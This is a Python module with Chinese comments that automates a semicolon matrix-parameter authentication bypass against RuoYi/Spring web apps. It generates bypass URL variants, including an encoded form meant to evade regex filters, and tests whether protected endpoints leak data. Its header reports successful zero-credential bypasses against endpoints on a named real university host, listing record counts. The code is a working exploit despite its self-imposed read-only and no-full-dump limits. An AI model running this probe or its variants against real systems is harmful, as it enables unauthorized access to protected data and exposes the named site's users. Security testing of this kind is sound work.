"""分号矩阵鉴权绕过探测（3.1 新增）。

原理（RuoYi + Spring 的经典差异）：
  - JwtFilter / ShiroFilter 用 request.getRequestURI() 做**精确路径**匹配
  - Spring MVC 的 HandlerMapping 会剥掉 `;` 之后的 matrix parameter，按真实路径路由

于是 `/api/pool/contest/brief/list;a=b`：
  - JwtFilter 看到 `/api/pool/contest/brief/list;a=b`，不在白名单 → 本应拦截
    （但很多实现的 filter 用了 endsWith / contains 匹配，带 `;` 后匹配失败 → 直接放行）
  - Spring 侧剥掉 `;a=b` → 路由到真实的 `/api/pool/contest/brief/list`

实测（racelink.ccnu.edu.cn 2026-11-23，零凭据）：
  /api/pool/contest/brief/list       → 401 认证失败
  /api/pool/contest/brief/list;a=b   → 200, 86834B, 1110 条数据   ★
  /api/pool/rankings                 → 401
  /api/pool/rankings;a=b             → 200, 94392B, 396 条        ★

设计约束：
- 只对**返回 401/403 的只读 GET** 施加，不碰写接口
- 每个变体只试一次，不循环枚举
- 命中「200 且体积明显大于 401 响应」才算绕过成立
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import urlparse, urlunparse

logger = logging.getLogger(__name__)

# 施加矩阵参数的变体。顺序按实战命中率排。
MATRIX_VARIANTS = (
    ";a=b",
    ";x=1",
    ";jsessionid=x",
    ";a",
    "%3ba=b",        # 编码形式，绕过某些正则
)

# 只对这些状态码尝试（鉴权类拒绝）
_AUTH_DENY_CODES = (401, 403)
# 401/403 响应的典型体积上限（认证失败一般是几十字节的 JSON）
_DENY_BODY_MAX = 3000
# 超过这个体积就提示红线（实测某端点绕过返回 121MB / 25 万条）
DUMP_WARN_BYTES = int(__import__("os").environ.get("MATRIX_DUMP_WARN_BYTES", str(5 * 1024 * 1024)))


def _split_last_segment(path: str) -> tuple[str, str] | None:
    """把 /a/b/c 拆成 (/a/b, c)。段数不足时返回 None。"""
    p = path.rstrip("/")
    if "/" not in p:
        return None
    head, leaf = p.rsplit("/", 1)
    if not head or not leaf:
        return None
    return head, leaf


def build_matrix_urls(url: str, variants: tuple[str, ...] = MATRIX_VARIANTS) -> list[str]:
    """给 URL 生成分号矩阵变体。

    在**最后一段路径**后追加 `;a=b`：
      /api/pool/contest/brief/list  →  /api/pool/contest/brief/list;a=b
    保留原 query 不变。
    """
    try:
        p = urlparse(url)
    except Exception:
        return []
    parts = _split_last_segment(p.path)
    if not parts:
        return []
    head, leaf = parts
    out = []
    for v in variants:
        out.append(urlunparse((p.scheme, p.netloc, f"{head}/{leaf}{v}", p.params, p.query, p.fragment)))
    return out


def is_auth_bypass(
    baseline: dict[str, Any],
    probe: dict[str, Any],
) -> tuple[bool, str]:
    """判断一次矩阵探测是否构成鉴权绕过。

    baseline: 裸路径的响应 {status, size, body_head}
    probe:    矩阵路径的响应

    判定条件（全部满足）：
      1. baseline 是 401/403，或 body 里有 code:401/403
      2. probe 是 200
      3. probe 体积明显大于 baseline（至少 3 倍 + 大于 200 字节）
      4. probe body 里没有 code:401/403
    """
    b_status = int(baseline.get("status") or 0)
    p_status = int(probe.get("status") or 0)
    b_size = int(baseline.get("size") or 0)
    p_size = int(probe.get("size") or 0)
    b_body = str(baseline.get("body_head") or "")
    p_body = str(probe.get("body_head") or "")

    deny_by_status = b_status in _AUTH_DENY_CODES
    deny_by_body = bool(re.search(r'"code"\s*:\s*(?:401|403)', b_body))
    if not (deny_by_status or deny_by_body):
        return False, f"baseline 不是鉴权拒绝（status={b_status}）"

    if p_status != 200:
        return False, f"变体未返回 200（{p_status}）"

    if re.search(r'"code"\s*:\s*(?:401|403)', p_body):
        return False, "变体仍返回 code:401/403"

    if p_size < 200 or p_size < b_size * 3:
        return False, f"变体体积无显著增长（{b_size} → {p_size}）"

    return True, f"鉴权绕过成立：{b_status}({b_size}B) → 200({p_size}B)"


def oversized_warning(size: int) -> str:
    """超大红线的提示：实测有端点绕过返回 121MB / 25 万条。

    这已触发本分支的红线「禁止全量脱库」——不能把整表拖下来。
    """
    if size < DUMP_WARN_BYTES:
        return ""
    return (
        f"\n[红线·禁止全量脱库] 该响应 {size / 1024 / 1024:.1f}MB，已远超单次取数上限。"
        "证明危害不需要全量：改用 `LIMIT 3` 取 3-5 条样本 + 一条 COUNT(*) 说明规模，"
        "报告里写「共 N 条，样本 5 条」。禁止落盘、禁止整表导出。\n"
    )


def format_bypass_report(url: str, baseline: dict, probe: dict, variant: str) -> str:
    """生成可放进 finding 的报告文本。"""
    return (
        f"**分号矩阵绕过鉴权（矩阵参数 {variant}）**\n\n"
        f"- 裸路径：`GET {url}` → {baseline.get('status')}，"
        f"{baseline.get('size')}B\n"
        f"- 矩阵路径：`GET {probe.get('url', '')}` → {probe.get('status')}，"
        f"{probe.get('size')}B\n"
        f"- 结论：JwtFilter 按精确路径匹配，带 `;` 后跳过校验；"
        f"Spring 剥掉 matrix parameter 后仍路由到真实 handler。\n"
    )
